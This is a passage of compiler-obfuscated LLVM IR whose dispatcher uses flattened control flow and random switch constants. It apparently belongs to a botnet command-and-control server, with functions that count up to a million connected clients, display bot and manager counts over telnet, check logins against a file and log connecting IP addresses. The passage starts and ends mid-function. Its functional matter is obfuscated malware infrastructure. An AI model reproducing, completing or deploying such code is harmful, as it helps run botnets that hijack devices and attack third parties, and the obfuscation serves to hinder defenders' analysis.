  store i32 %173, i32* %switchVar
  br label %loopEnd

; <label>:174:                                    ; preds = %loopEntry
  %175 = getelementptr inbounds [2048 x i8], [2048 x i8]* %17, i32 0, i32 0
  %176 = call i8* @strstr(i8* %175, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.4, i32 0, i32 0)) #8
  %177 = icmp eq i8* %176, null
  %178 = select i1 %177, i32 -1596363870, i32 1723244188
  store i32 %178, i32* %switchVar
  br label %loopEnd

; <label>:179:                                    ; preds = %loopEntry
  store i32 1, i32* %15, align 4
  store i32 1346414750, i32* %switchVar
  br label %loopEnd

; <label>:180:                                    ; preds = %loopEntry
  %181 = getelementptr inbounds [2048 x i8], [2048 x i8]* %17, i32 0, i32 0
  call void @trim(i8* %181)
  %182 = getelementptr inbounds [2048 x i8], [2048 x i8]* %17, i32 0, i32 0
  %183 = call i32 @strcmp(i8* %182, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str, i32 0, i32 0)) #8
  %184 = icmp eq i32 %183, 0
  %185 = select i1 %184, i32 -831964385, i32 271705244
  store i32 %185, i32* %switchVar
  br label %loopEnd

; <label>:186:                                    ; preds = %loopEntry
  %187 = load i32, i32* %13, align 4
  %188 = call i64 @send(i32 %187, i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.5, i32 0, i32 0), i64 5, i32 16384)
  %189 = icmp eq i64 %188, -1
  %190 = select i1 %189, i32 -1878892417, i32 828830684
  store i32 %190, i32* %switchVar
  br label %loopEnd

; <label>:191:                                    ; preds = %loopEntry
  store i32 1, i32* %15, align 4
  store i32 1346414750, i32* %switchVar
  br label %loopEnd

; <label>:192:                                    ; preds = %loopEntry
  store i32 1305558908, i32* %switchVar
  br label %loopEnd

; <label>:193:                                    ; preds = %loopEntry
  %194 = getelementptr inbounds [2048 x i8], [2048 x i8]* %17, i32 0, i32 0
  %195 = call i32 @strcmp(i8* %194, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.6, i32 0, i32 0)) #8
  %196 = icmp eq i32 %195, 0
  %197 = select i1 %196, i32 -947674529, i32 -1577597907
  store i32 %197, i32* %switchVar
  br label %loopEnd

; <label>:198:                                    ; preds = %loopEntry
  store i32 1305558908, i32* %switchVar
  br label %loopEnd

; <label>:199:                                    ; preds = %loopEntry
  %200 = getelementptr inbounds [2048 x i8], [2048 x i8]* %17, i32 0, i32 0
  %201 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.7, i32 0, i32 0), i8* %200)
  store i32 1305558908, i32* %switchVar
  br label %loopEnd

; <label>:202:                                    ; preds = %loopEntry
  %203 = load i64, i64* %16, align 8
  %204 = icmp eq i64 %203, -1
  %205 = select i1 %204, i32 -2051716275, i32 -146560601
  store i32 %205, i32* %switchVar
  br label %loopEnd

; <label>:206:                                    ; preds = %loopEntry
  %207 = call i32* @__errno_location() #9
  %208 = load i32, i32* %207, align 4
  %209 = icmp ne i32 %208, 11
  %210 = select i1 %209, i32 -773457098, i32 -1627102883
  store i32 %210, i32* %switchVar
  br label %loopEnd

; <label>:211:                                    ; preds = %loopEntry
  store i32 1, i32* %15, align 4
  store i32 -1627102883, i32* %switchVar
  br label %loopEnd

; <label>:212:                                    ; preds = %loopEntry
  store i32 -1371855760, i32* %switchVar
  br label %loopEnd

; <label>:213:                                    ; preds = %loopEntry
  %214 = load i64, i64* %16, align 8
  %215 = icmp eq i64 %214, 0
  %216 = select i1 %215, i32 -1204388054, i32 777134335
  store i32 %216, i32* %switchVar
  br label %loopEnd

; <label>:217:                                    ; preds = %loopEntry
  store i32 1, i32* %15, align 4
  store i32 -1371855760, i32* %switchVar
  br label %loopEnd

; <label>:218:                                    ; preds = %loopEntry
  store i32 2109523245, i32* %switchVar
  br label %loopEnd

; <label>:219:                                    ; preds = %loopEntry
  store i32 1758602457, i32* %switchVar
  br label %loopEnd

; <label>:220:                                    ; preds = %loopEntry
  %221 = load i32, i32* %15, align 4
  %222 = icmp ne i32 %221, 0
  %223 = select i1 %222, i32 1187592278, i32 -1045519209
  store i32 %223, i32* %switchVar
  br label %loopEnd

; <label>:224:                                    ; preds = %loopEntry
  %225 = load %struct.clientdata_t*, %struct.clientdata_t** %14, align 8
  %226 = getelementptr inbounds %struct.clientdata_t, %struct.clientdata_t* %225, i32 0, i32 2
  store i8 0, i8* %226, align 1
  %227 = load i32, i32* %13, align 4
  %228 = call i32 @close(i32 %227)
  store i32 -1045519209, i32* %switchVar
  br label %loopEnd

; <label>:229:                                    ; preds = %loopEntry
  store i32 -453020185, i32* %switchVar
  br label %loopEnd

; <label>:230:                                    ; preds = %loopEntry
  store i32 -424808196, i32* %switchVar
  br label %loopEnd

; <label>:231:                                    ; preds = %loopEntry
  store i32 -1759861867, i32* %switchVar
  br label %loopEnd

; <label>:232:                                    ; preds = %loopEntry
  %233 = load i32, i32* %8, align 4
  %234 = add nsw i32 %233, 1
  store i32 %234, i32* %8, align 4
  store i32 -1899627426, i32* %switchVar
  br label %loopEnd

; <label>:235:                                    ; preds = %loopEntry
  store i32 1391819144, i32* %switchVar
  br label %loopEnd

; <label>:236:                                    ; preds = %loopEntry
  %237 = load i8*, i8** %2, align 8
  ret i8* %237

loopEnd:                                          ; preds = %235, %232, %231, %230, %229, %224, %220, %219, %218, %217, %213, %212, %211, %206, %202, %199, %198, %193, %192, %191, %186, %180, %179, %174, %172, %166, %162, %160, %147, %146, %139, %136, %125, %122, %108, %107, %106, %101, %96, %90, %89, %78, %59, %49, %39, %29, %24, %20, %switchDefault
  br label %loopEntry
}

; Function Attrs: nounwind
declare noalias i8* @calloc(i64, i64) #3

declare i32 @epoll_wait(i32, %struct.epoll_event*, i32, i32) #1

declare i32 @close(i32) #1

declare i32 @accept(i32, %struct.sockaddr*, i32*) #1

; Function Attrs: nounwind readnone
declare i32* @__errno_location() #5

declare void @perror(i8*) #1

; Function Attrs: noinline nounwind uwtable
define internal i32 @make_socket_non_blocking(i32) #0 {
  %.reg2mem = alloca i32
  %2 = alloca i32, align 4
  %3 = alloca i32, align 4
  %4 = alloca i32, align 4
  %5 = alloca i32, align 4
  store i32 %0, i32* %3, align 4
  %6 = load i32, i32* %3, align 4
  %7 = call i32 (i32, i32, ...) @fcntl(i32 %6, i32 3, i32 0)
  store i32 %7, i32* %4, align 4
  %8 = load i32, i32* %4, align 4
  store i32 %8, i32* %.reg2mem
  %switchVar = alloca i32
  store i32 -1543623612, i32* %switchVar
  br label %loopEntry

loopEntry:                                        ; preds = %loopEnd, %1
  %switchVar1 = load i32, i32* %switchVar
  switch i32 %switchVar1, label %switchDefault [
    i32 -1543623612, label %first
    i32 377412082, label %11
    i32 -1899754384, label %12
    i32 -2053696908, label %21
    i32 1279672780, label %22
    i32 -1787861767, label %23
  ]

switchDefault:                                    ; preds = %loopEntry
  br label %loopEnd

first:                                            ; preds = %loopEntry
  %.reload = load volatile i32, i32* %.reg2mem
  %9 = icmp eq i32 %.reload, -1
  %10 = select i1 %9, i32 377412082, i32 -1899754384
  store i32 %10, i32* %switchVar
  br label %loopEnd

; <label>:11:                                     ; preds = %loopEntry
  call void @perror(i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.219, i32 0, i32 0))
  store i32 -1, i32* %2, align 4
  store i32 -1787861767, i32* %switchVar
  br label %loopEnd

; <label>:12:                                     ; preds = %loopEntry
  %13 = load i32, i32* %4, align 4
  %14 = or i32 %13, 2048
  store i32 %14, i32* %4, align 4
  %15 = load i32, i32* %3, align 4
  %16 = load i32, i32* %4, align 4
  %17 = call i32 (i32, i32, ...) @fcntl(i32 %15, i32 4, i32 %16)
  store i32 %17, i32* %5, align 4
  %18 = load i32, i32* %5, align 4
  %19 = icmp eq i32 %18, -1
  %20 = select i1 %19, i32 -2053696908, i32 1279672780
  store i32 %20, i32* %switchVar
  br label %loopEnd

; <label>:21:                                     ; preds = %loopEntry
  call void @perror(i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.219, i32 0, i32 0))
  store i32 -1, i32* %2, align 4
  store i32 -1787861767, i32* %switchVar
  br label %loopEnd

; <label>:22:                                     ; preds = %loopEntry
  store i32 0, i32* %2, align 4
  store i32 -1787861767, i32* %switchVar
  br label %loopEnd

; <label>:23:                                     ; preds = %loopEntry
  %24 = load i32, i32* %2, align 4
  ret i32 %24

loopEnd:                                          ; preds = %22, %21, %12, %11, %first, %switchDefault
  br label %loopEntry
}

; Function Attrs: nounwind
declare i32 @epoll_ctl(i32, i32, i32, %struct.epoll_event*) #3

declare i64 @send(i32, i8*, i64, i32) #1

; Function Attrs: nounwind readonly
declare i8* @strstr(i8*, i8*) #2

declare i32 @printf(i8*, ...) #1

declare i32 @fcntl(i32, i32, ...) #1

; Function Attrs: noinline nounwind uwtable
define i32 @clientsConnected() #0 {
  %1 = alloca i32, align 4
  %2 = alloca i32, align 4
  store i32 0, i32* %1, align 4
  store i32 0, i32* %2, align 4
  store i32 0, i32* %1, align 4
  %switchVar = alloca i32
  store i32 -1207808395, i32* %switchVar
  br label %loopEntry

loopEntry:                                        ; preds = %loopEnd, %0
  %switchVar1 = load i32, i32* %switchVar
  switch i32 %switchVar1, label %switchDefault [
    i32 -1207808395, label %3
    i32 1681968689, label %7
    i32 1336297809, label %15
    i32 -845862538, label %16
    i32 -1159532787, label %19
    i32 -909581128, label %22
  ]

switchDefault:                                    ; preds = %loopEntry
  br label %loopEnd

; <label>:3:                                      ; preds = %loopEntry
  %4 = load i32, i32* %1, align 4
  %5 = icmp slt i32 %4, 1000000
  %6 = select i1 %5, i32 1681968689, i32 -909581128
  store i32 %6, i32* %switchVar
  br label %loopEnd

; <label>:7:                                      ; preds = %loopEntry
  %8 = load i32, i32* %1, align 4
  %9 = sext i32 %8 to i64
  %10 = getelementptr inbounds [1000000 x %struct.clientdata_t], [1000000 x %struct.clientdata_t]* @clients, i64 0, i64 %9
  %11 = getelementptr inbounds %struct.clientdata_t, %struct.clientdata_t* %10, i32 0, i32 2
  %12 = load i8, i8* %11, align 1
  %13 = icmp ne i8 %12, 0
  %14 = select i1 %13, i32 -845862538, i32 1336297809
  store i32 %14, i32* %switchVar
  br label %loopEnd

; <label>:15:                                     ; preds = %loopEntry
  store i32 -1159532787, i32* %switchVar
  br label %loopEnd

; <label>:16:                                     ; preds = %loopEntry
  %17 = load i32, i32* %2, align 4
  %18 = add nsw i32 %17, 1
  store i32 %18, i32* %2, align 4
  store i32 -1159532787, i32* %switchVar
  br label %loopEnd

; <label>:19:                                     ; preds = %loopEntry
  %20 = load i32, i32* %1, align 4
  %21 = add nsw i32 %20, 1
  store i32 %21, i32* %1, align 4
  store i32 -1207808395, i32* %switchVar
  br label %loopEnd

; <label>:22:                                     ; preds = %loopEntry
  %23 = load i32, i32* %2, align 4
  ret i32 %23

loopEnd:                                          ; preds = %19, %16, %15, %7, %3, %switchDefault
  br label %loopEntry
}

; Function Attrs: noinline nounwind uwtable
define i8* @titleWriter(i8*) #0 {
  %2 = alloca i8*, align 8
  %3 = alloca i8*, align 8
  %4 = alloca i32, align 4
  %5 = alloca [2048 x i8], align 16
  store i8* %0, i8** %3, align 8
  %6 = load i8*, i8** %3, align 8
  %7 = ptrtoint i8* %6 to i32
  store i32 %7, i32* %4, align 4
  %switchVar = alloca i32
  store i32 392010206, i32* %switchVar
  br label %loopEntry

loopEntry:                                        ; preds = %loopEnd, %1
  %switchVar1 = load i32, i32* %switchVar
  switch i32 %switchVar1, label %switchDefault [
    i32 392010206, label %8
    i32 454013348, label %21
    i32 2007930055, label %22
    i32 -1390409968, label %24
  ]

switchDefault:                                    ; preds = %loopEntry
  br label %loopEnd

; <label>:8:                                      ; preds = %loopEntry
  %9 = getelementptr inbounds [2048 x i8], [2048 x i8]* %5, i32 0, i32 0
  call void @llvm.memset.p0i8.i64(i8* %9, i8 0, i64 2048, i32 16, i1 false)
  %10 = getelementptr inbounds [2048 x i8], [2048 x i8]* %5, i32 0, i32 0
  %11 = call i32 @clientsConnected()
  %12 = load volatile i32, i32* @managesConnected, align 4
  %13 = call i32 (i8*, i8*, ...) @sprintf(i8* %10, i8* getelementptr inbounds ([64 x i8], [64 x i8]* @.str.8, i32 0, i32 0), i32 27, i32 %11, i32 %12, i32 7) #7
  %14 = load i32, i32* %4, align 4
  %15 = getelementptr inbounds [2048 x i8], [2048 x i8]* %5, i32 0, i32 0
  %16 = getelementptr inbounds [2048 x i8], [2048 x i8]* %5, i32 0, i32 0
  %17 = call i64 @strlen(i8* %16) #8
  %18 = call i64 @send(i32 %14, i8* %15, i64 %17, i32 16384)
  %19 = icmp eq i64 %18, -1
  %20 = select i1 %19, i32 454013348, i32 2007930055
  store i32 %20, i32* %switchVar
  br label %loopEnd

; <label>:21:                                     ; preds = %loopEntry
  store i32 2007930055, i32* %switchVar
  br label %loopEnd

; <label>:22:                                     ; preds = %loopEntry
  %23 = call i32 @sleep(i32 2)
  store i32 392010206, i32* %switchVar
  br label %loopEnd

; <label>:24:                                     ; preds = %loopEntry
  %25 = load i8*, i8** %2, align 8
  ret i8* %25

loopEnd:                                          ; preds = %22, %21, %8, %switchDefault
  br label %loopEntry
}

; Function Attrs: nounwind
declare i32 @sprintf(i8*, i8*, ...) #3

declare i32 @sleep(i32) #1

; Function Attrs: noinline nounwind uwtable
define i32 @Search_in_File(i8*) #0 {
  %.reg2mem = alloca %struct._IO_FILE*
  %2 = alloca i32, align 4
  %3 = alloca i8*, align 8
  %4 = alloca %struct._IO_FILE*, align 8
  %5 = alloca i32, align 4
  %6 = alloca i32, align 4
  %7 = alloca i32, align 4
  %8 = alloca [512 x i8], align 16
  store i8* %0, i8** %3, align 8
  store i32 0, i32* %5, align 4
  store i32 0, i32* %6, align 4
  store i32 0, i32* %7, align 4
  %9 = call %struct._IO_FILE* @fopen(i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.9, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.10, i32 0, i32 0))
  store %struct._IO_FILE* %9, %struct._IO_FILE** %.reg2mem
  %.reload2 = load volatile %struct._IO_FILE*, %struct._IO_FILE** %.reg2mem
  store %struct._IO_FILE* %.reload2, %struct._IO_FILE** %4, align 8
  %switchVar = alloca i32
  store i32 -2102789574, i32* %switchVar
  br label %loopEntry

loopEntry:                                        ; preds = %loopEnd, %1
  %switchVar1 = load i32, i32* %switchVar
  switch i32 %switchVar1, label %switchDefault [
    i32 -2102789574, label %first
    i32 -1591160129, label %12
    i32 -941073874, label %13
    i32 -700264771, label %14
    i32 -848059799, label %20
    i32 721078158, label %26
    i32 -1101830594, label %30
    i32 1379903535, label %33
    i32 -1892072336, label %37
    i32 -1722924909, label %40
    i32 48432353, label %44
    i32 -462789319, label %45
    i32 1309750653, label %47
  ]

switchDefault:                                    ; preds = %loopEntry
  br label %loopEnd

first:                                            ; preds = %loopEntry
  %.reload = load volatile %struct._IO_FILE*, %struct._IO_FILE** %.reg2mem
  %10 = icmp eq %struct._IO_FILE* %.reload, null
  %11 = select i1 %10, i32 -1591160129, i32 -941073874
  store i32 %11, i32* %switchVar
  br label %loopEnd

; <label>:12:                                     ; preds = %loopEntry
  store i32 -1, i32* %2, align 4
  store i32 1309750653, i32* %switchVar
  br label %loopEnd

; <label>:13:                                     ; preds = %loopEntry
  store i32 -700264771, i32* %switchVar
  br label %loopEnd

; <label>:14:                                     ; preds = %loopEntry
  %15 = getelementptr inbounds [512 x i8], [512 x i8]* %8, i32 0, i32 0
  %16 = load %struct._IO_FILE*, %struct._IO_FILE** %4, align 8
  %17 = call i8* @fgets(i8* %15, i32 512, %struct._IO_FILE* %16)
  %18 = icmp ne i8* %17, null
  %19 = select i1 %18, i32 -848059799, i32 1379903535
  store i32 %19, i32* %switchVar
  br label %loopEnd

; <label>:20:                                     ; preds = %loopEntry
  %21 = getelementptr inbounds [512 x i8], [512 x i8]* %8, i32 0, i32 0
  %22 = load i8*, i8** %3, align 8
  %23 = call i8* @strstr(i8* %21, i8* %22) #8
  %24 = icmp ne i8* %23, null
  %25 = select i1 %24, i32 721078158, i32 -1101830594
  store i32 %25, i32* %switchVar
  br label %loopEnd

; <label>:26:                                     ; preds = %loopEntry
  %27 = load i32, i32* %6, align 4
  %28 = add nsw i32 %27, 1
  store i32 %28, i32* %6, align 4
  %29 = load i32, i32* %5, align 4
  store i32 %29, i32* %7, align 4
  store i32 -1101830594, i32* %switchVar
  br label %loopEnd

; <label>:30:                                     ; preds = %loopEntry
  %31 = load i32, i32* %5, align 4
  %32 = add nsw i32 %31, 1
  store i32 %32, i32* %5, align 4
  store i32 -700264771, i32* %switchVar
  br label %loopEnd

; <label>:33:                                     ; preds = %loopEntry
  %34 = load %struct._IO_FILE*, %struct._IO_FILE** %4, align 8
  %35 = icmp ne %struct._IO_FILE* %34, null
  %36 = select i1 %35, i32 -1892072336, i32 -1722924909
  store i32 %36, i32* %switchVar
  br label %loopEnd

; <label>:37:                                     ; preds = %loopEntry
  %38 = load %struct._IO_FILE*, %struct._IO_FILE** %4, align 8
  %39 = call i32 @fclose(%struct._IO_FILE* %38)
  store i32 -1722924909, i32* %switchVar
  br label %loopEnd

; <label>:40:                                     ; preds = %loopEntry
  %41 = load i32, i32* %6, align 4
  %42 = icmp eq i32 %41, 0
  %43 = select i1 %42, i32 48432353, i32 -462789319
  store i32 %43, i32* %switchVar
  br label %loopEnd

; <label>:44:                                     ; preds = %loopEntry
  store i32 0, i32* %2, align 4
  store i32 1309750653, i32* %switchVar
  br label %loopEnd

; <label>:45:                                     ; preds = %loopEntry
  %46 = load i32, i32* %7, align 4
  store i32 %46, i32* %2, align 4
  store i32 1309750653, i32* %switchVar
  br label %loopEnd

; <label>:47:                                     ; preds = %loopEntry
  %48 = load i32, i32* %2, align 4
  ret i32 %48

loopEnd:                                          ; preds = %45, %44, %40, %37, %33, %30, %26, %20, %14, %13, %12, %first, %switchDefault
  br label %loopEntry
}

declare %struct._IO_FILE* @fopen(i8*, i8*) #1

declare i8* @fgets(i8*, i32, %struct._IO_FILE*) #1

declare i32 @fclose(%struct._IO_FILE*) #1

; Function Attrs: noinline nounwind uwtable
define void @client_addr(i64, i64) #0 {
  %3 = alloca %struct.sockaddr_in, align 4
  %4 = alloca %struct._IO_FILE*, align 8
  %5 = bitcast %struct.sockaddr_in* %3 to { i64, i64 }*
  %6 = getelementptr inbounds { i64, i64 }, { i64, i64 }* %5, i32 0, i32 0
  store i64 %0, i64* %6, align 4
  %7 = getelementptr inbounds { i64, i64 }, { i64, i64 }* %5, i32 0, i32 1
  store i64 %1, i64* %7, align 4
  %8 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %3, i32 0, i32 2
  %9 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %8, i32 0, i32 0
  %10 = load i32, i32* %9, align 4
  %11 = and i32 %10, 255
  %12 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %3, i32 0, i32 2
  %13 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %12, i32 0, i32 0
  %14 = load i32, i32* %13, align 4
  %15 = and i32 %14, 65280
  %16 = lshr i32 %15, 8
  %17 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %3, i32 0, i32 2
  %18 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %17, i32 0, i32 0
  %19 = load i32, i32* %18, align 4
  %20 = and i32 %19, 16711680
  %21 = lshr i32 %20, 16
  %22 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %3, i32 0, i32 2
  %23 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %22, i32 0, i32 0
  %24 = load i32, i32* %23, align 4
  %25 = and i32 %24, -16777216
  %26 = lshr i32 %25, 24
  %27 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([36 x i8], [36 x i8]* @.str.11, i32 0, i32 0), i32 %11, i32 %16, i32 %21, i32 %26)
  %28 = call %struct._IO_FILE* @fopen(i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.12, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.13, i32 0, i32 0))
  store %struct._IO_FILE* %28, %struct._IO_FILE** %4, align 8
  %29 = load %struct._IO_FILE*, %struct._IO_FILE** %4, align 8
  %30 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %3, i32 0, i32 2
  %31 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %30, i32 0, i32 0
  %32 = load i32, i32* %31, align 4
  %33 = and i32 %32, 255
  %34 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %3, i32 0, i32 2
  %35 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %34, i32 0, i32 0
  %36 = load i32, i32* %35, align 4
  %37 = and i32 %36, 65280
  %38 = lshr i32 %37, 8
  %39 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %3, i32 0, i32 2
  %40 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %39, i32 0, i32 0
  %41 = load i32, i32* %40, align 4
  %42 = and i32 %41, 16711680
  %43 = lshr i32 %42, 16
  %44 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %3, i32 0, i32 2
  %45 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %44, i32 0, i32 0
  %46 = load i32, i32* %45, align 4
  %47 = and i32 %46, -16777216
  %48 = lshr i32 %47, 24
  %49 = call i32 (%struct._IO_FILE*, i8*, ...) @fprintf(%struct._IO_FILE* %29, i8* getelementptr inbounds ([36 x i8], [36 x i8]* @.str.14, i32 0, i32 0), i32 %33, i32 %38, i32 %43, i32 %48)
  %50 = load %struct._IO_FILE*, %struct._IO_FILE** %4, align 8
  %51 = call i32 @fclose(%struct._IO_FILE* %50)
  ret void
}

declare i32 @fprintf(%struct._IO_FILE*, i8*, ...) #1

; Function Attrs: noinline nounwind uwtable
define i8* @telnetWorker(i8*) #0 {
  %2 = alloca i8*, align 8
  %3 = alloca i8*, align 8
  %4 = alloca i32, align 4
  %5 = alloca i32, align 4
  %6 = alloca i64, align 8
  %7 = alloca [2048 x i8], align 16
  %8 = alloca [2048 x i8], align 16
  %9 = alloca i8*, align 8
  %10 = alloca [80 x i8], align 16
  %11 = alloca i8*, align 8
  %12 = alloca i8*, align 8
  %13 = alloca [2048 x i8], align 16
  %14 = alloca %struct._IO_FILE*, align 8
  %15 = alloca i32, align 4
  %16 = alloca i32, align 4
  %17 = alloca i32, align 4
  %18 = alloca [5000 x i8], align 16
  %19 = alloca [5000 x i8], align 16
  %20 = alloca [5000 x i8], align 16
  %21 = alloca [90000 x i8], align 16
  %22 = alloca [90000 x i8], align 16
  %23 = alloca [90000 x i8], align 16
  %24 = alloca [5000 x i8], align 16
  %25 = alloca [5000 x i8], align 16
  %26 = alloca [5000 x i8], align 16
  %27 = alloca [5000 x i8], align 16
  %28 = alloca [5000 x i8], align 16
  %29 = alloca [5000 x i8], align 16
  %30 = alloca [5000 x i8], align 16
  %31 = alloca [5000 x i8], align 16
  %32 = alloca [5000 x i8], align 16
  %33 = alloca [5000 x i8], align 16
  %34 = alloca [5000 x i8], align 16
  %35 = alloca [5000 x i8], align 16
  %36 = alloca [5000 x i8], align 16
  %37 = alloca [5000 x i8], align 16
  %38 = alloca [5000 x i8], align 16
  %39 = alloca [5000 x i8], align 16
  %40 = alloca [5000 x i8], align 16
  %41 = alloca [5000 x i8], align 16
  %42 = alloca [5000 x i8], align 16
  %43 = alloca [5000 x i8], align 16
  %44 = alloca [5000 x i8], align 16
  %45 = alloca [5000 x i8], align 16
  %46 = alloca [5000 x i8], align 16
  %47 = alloca [5000 x i8], align 16
  %48 = alloca [5000 x i8], align 16
  %49 = alloca [5000 x i8], align 16
  %50 = alloca [5000 x i8], align 16
  %51 = alloca [5000 x i8], align 16
  %52 = alloca [5000 x i8], align 16
  %53 = alloca [5000 x i8], align 16
  %54 = alloca [5000 x i8], align 16
  %55 = alloca [5000 x i8], align 16
  %56 = alloca [5000 x i8], align 16
  %57 = alloca [5000 x i8], align 16
  %58 = alloca [5000 x i8], align 16
  %59 = alloca [5000 x i8], align 16
  %60 = alloca [5000 x i8], align 16
  %61 = alloca [5000 x i8], align 16
  %62 = alloca [5000 x i8], align 16
  %63 = alloca [5000 x i8], align 16
  %64 = alloca [5000 x i8], align 16
  %65 = alloca [5000 x i8], align 16
  %66 = alloca [5000 x i8], align 16
  %67 = alloca [5000 x i8], align 16
  %68 = alloca [5000 x i8], align 16
  %69 = alloca [5000 x i8], align 16
  %70 = alloca [5000 x i8], align 16
  %71 = alloca [5000 x i8], align 16
  %72 = alloca [5000 x i8], align 16
  %73 = alloca [5000 x i8], align 16
  %74 = alloca [5000 x i8], align 16
  %75 = alloca [5000 x i8], align 16
  %76 = alloca [5000 x i8], align 16
  %77 = alloca [5000 x i8], align 16
  %78 = alloca [5000 x i8], align 16
  %79 = alloca [5000 x i8], align 16
  %80 = alloca [5000 x i8], align 16
  %81 = alloca [5000 x i8], align 16
  %82 = alloca [5000 x i8], align 16
  %83 = alloca [5000 x i8], align 16
  %84 = alloca [5000 x i8], align 16
  %85 = alloca [5000 x i8], align 16
  %86 = alloca [5000 x i8], align 16
  %87 = alloca [5000 x i8], align 16
  %88 = alloca [5000 x i8], align 16
  %89 = alloca [5000 x i8], align 16
  %90 = alloca [5000 x i8], align 16
  %91 = alloca [5000 x i8], align 16
  %92 = alloca [5000 x i8], align 16
  %93 = alloca [5000 x i8], align 16
  %94 = alloca [5000 x i8], align 16
  %95 = alloca [5000 x i8], align 16
  %96 = alloca [5000 x i8], align 16
  %97 = alloca [5000 x i8], align 16
  %98 = alloca %struct._IO_FILE*, align 8
  %99 = alloca %struct._IO_FILE*, align 8
  %100 = alloca %struct._IO_FILE*, align 8
  %101 = alloca [100 x i8*], align 16
  %102 = alloca i8*, align 8
  %103 = alloca i8*, align 8
  %104 = alloca i8*, align 8
  %105 = alloca i8*, align 8
  %106 = alloca [50 x i8*], align 16
  %107 = alloca [100 x i8*], align 16
  %108 = alloca [100 x i8*], align 16
  %109 = alloca [100 x i8*], align 16
  %110 = alloca [50 x i8*], align 16
  %111 = alloca %struct._IO_FILE*, align 8
  store i8* %0, i8** %3, align 8
  %112 = load i8*, i8** %3, align 8
  %113 = ptrtoint i8* %112 to i32
  store i32 %113, i32* %4, align 4
  %114 = load volatile i32, i32* @managesConnected, align 4
  %115 = add nsw i32 %114, 1
  store volatile i32 %115, i32* @managesConnected, align 4
  %116 = getelementptr inbounds [2048 x i8], [2048 x i8]* %7, i32 0, i32 0
  call void @llvm.memset.p0i8.i64(i8* %116, i8 0, i64 2048, i32 16, i1 false)
  store i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.15, i32 0, i32 0), i8** %12, align 8
  %117 = getelementptr inbounds [2048 x i8], [2048 x i8]* %8, i32 0, i32 0
  call void @llvm.memset.p0i8.i64(i8* %117, i8 0, i64 2048, i32 16, i1 false)
  %118 = getelementptr inbounds [2048 x i8], [2048 x i8]* %13, i32 0, i32 0
  call void @llvm.memset.p0i8.i64(i8* %118, i8 0, i64 2048, i32 16, i1 false)
  store i32 0, i32* %15, align 4
  %119 = call %struct._IO_FILE* @fopen(i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.9, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.10, i32 0, i32 0))
  store %struct._IO_FILE* %119, %struct._IO_FILE** %14, align 8
  %switchVar = alloca i32
  store i32 1750345377, i32* %switchVar
  br label %loopEntry

loopEntry:                                        ; preds = %loopEnd, %1
  %switchVar1 = load i32, i32* %switchVar
  switch i32 %switchVar1, label %switchDefault [
    i32 1750345377, label %120
    i32 439907680, label %126
    i32 -1601727312, label %131
    i32 517141801, label %133
    i32 223926465, label %139
    i32 555777999, label %159
    i32 -288719121, label %169
    i32 1299783269, label %170
    i32 -368665475, label %180
    i32 -1470276117, label %181
    i32 -1221340798, label %187
    i32 -2046868321, label %188
    i32 121720028, label %205
    i32 -1919112581, label %215
    i32 -1271456828, label %216
    i32 533930306, label %222
    i32 -421616647, label %223
    i32 -1143500144, label %234
    i32 -1682023383, label %235
    i32 180318446, label %237
    i32 -2077916187, label %238
    i32 1982346680, label %256
    i32 1844926162, label %257
    i32 -19523524, label %265
    i32 -64405427, label %266
    i32 66870078, label %274
    i32 617169406, label %275
    i32 -310015403, label %277
    i32 -190055821, label %284
    i32 -1764870627, label %285
    i32 1348405995, label %290
    i32 847574546, label %291
    i32 95838048, label %302
    i32 -368814786, label %303
    i32 -2103068164, label %311
    i32 71274203, label %312
    i32 227429708, label %320
    i32 77354030, label %321
    i32 -1659387318, label %329
    i32 -574066717, label %330
    i32 -30612690, label %331
    i32 1323293782, label %347
    i32 -767225582, label %348
    i32 1988860721, label %349
    i32 473462240, label %356
    i32 -597458717, label %362
    i32 -1714669571, label %367
    i32 847241961, label %372
    i32 130255518, label %377
    i32 1919318703, label %382
    i32 1920153956, label %394
    i32 -1250706196, label %395
    i32 -1064280221, label %396
    i32 1544188791, label %401
    i32 -1324392028, label %406
    i32 -2056959592, label %411
    i32 -139933864, label %441
    i32 623875022, label %442
    i32 132064297, label %450
    i32 313997406, label %451
    i32 -1393828428, label %459
    i32 -1959402805, label %460
    i32 1155020558, label %468
    i32 -104686350, label %469
    i32 2101872946, label %477
    i32 -1948179826, label %478
    i32 -1558159766, label %486
    i32 -93935791, label %487
    i32 1574645227, label %495
    i32 -1978595635, label %496
    i32 301065318, label %504
    i32 -1111495627, label %505
    i32 -491260494, label %513
    i32 937895497, label %514
    i32 577279107, label %522
    i32 -1707440861, label %523
    i32 143636807, label %531
    i32 1473514884, label %532
    i32 229766724, label %535
    i32 658096482, label %551
